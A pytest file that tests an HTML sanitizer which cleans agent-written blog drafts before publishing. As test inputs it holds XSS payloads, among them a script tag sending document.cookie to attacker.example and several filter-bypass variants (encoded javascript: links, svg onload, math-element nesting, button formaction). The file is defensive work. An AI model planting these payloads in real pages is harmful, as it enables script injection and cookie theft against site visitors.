"""The deterministic safety gate that cleans a draft before publishing."""

from src.agents.sanitize import clean_title, sanitize_html


def test_strips_the_script_tag_that_reached_the_baseline_draft():
    """An injected script tag is removed, and the surrounding post survives."""
    draft = ('<h2>XSS</h2><p>Example:</p>'
             '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
             '<p>after</p>')

    cleaned, removed = sanitize_html(draft)

    assert "<script" not in cleaned
    assert "attacker.example" not in cleaned
    assert "<p>after</p>" in cleaned, "content after the payload must survive"
    assert removed


def test_strips_inline_event_handlers():
    cleaned, removed = sanitize_html('<p onclick="steal()">text</p>')

    assert "onclick" not in cleaned
    assert ">text<" in cleaned
    assert removed


def test_strips_javascript_urls():
    cleaned, removed = sanitize_html('<a href="javascript:alert(1)">click</a>')

    assert "javascript:" not in cleaned
    assert removed


def test_strips_iframes_and_images():
    cleaned, removed = sanitize_html('<iframe src="//evil"></iframe><img src="//tracker">')

    assert "<iframe" not in cleaned and "<img" not in cleaned
    assert removed


def test_leaves_escaped_code_examples_alone():
    """Escaped markup shown as an example is left alone."""
    draft = "<p>Write <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to inject.</p>"

    cleaned, removed = sanitize_html(draft)

    assert cleaned == draft
    assert removed == []


def test_leaves_a_clean_draft_untouched():
    draft = "<h2>Title</h2><p>Body with <strong>bold</strong> and a <code>tag</code>.</p>"

    cleaned, removed = sanitize_html(draft)

    assert cleaned == draft
    assert removed == []


def test_handles_an_empty_draft():
    assert sanitize_html("") == ("", [])


def test_blocks_payloads_that_bypassed_the_old_regex_blocklist():
    """An allowlist does not depend on guessing every attack spelling."""
    payloads = [
        '<p><a/onmouseover=alert(1)>x</a></p>',
        '<p><a href="java&#115;cript:alert(1)">x</a></p>',
        '<p><a href="data:text/html,<script>alert(1)</script>">x</a></p>',
        '<p><svg onload=alert(1)></svg></p>',
        '<p><math><mtext><a href="javascript:alert(1)">x</a></mtext></math></p>',
        '<p><button formaction="javascript:alert(1)">x</button></p>',
    ]
    for payload in payloads:
        cleaned, removed = sanitize_html(payload)
        lowered = cleaned.lower()
        assert not any(t in lowered for t in ("<a", "<svg", "<math", "<button", "<script")), payload
        assert "onmouseover" not in lowered and "javascript" not in lowered, payload
        assert "href" not in lowered and "formaction" not in lowered, payload
        assert removed, payload


def test_unknown_tags_are_dropped_but_their_text_is_kept():
    cleaned, removed = sanitize_html("<h3><Qoute>Manufacturing Shifts</Qoute></h3>")

    assert cleaned == "<h3>Manufacturing Shifts</h3>"
    assert "qoute" in removed[0]


def test_title_is_plain_text_with_no_markup():
    title = clean_title('Why RAM <script>alert(1)</script> prices <b>rose</b> &amp; fell')

    assert "<" not in title and ">" not in title
    assert "alert" not in title
    assert title == "Why RAM prices rose & fell"


def test_title_is_capped_in_length():
    assert len(clean_title("word " * 100)) <= 150
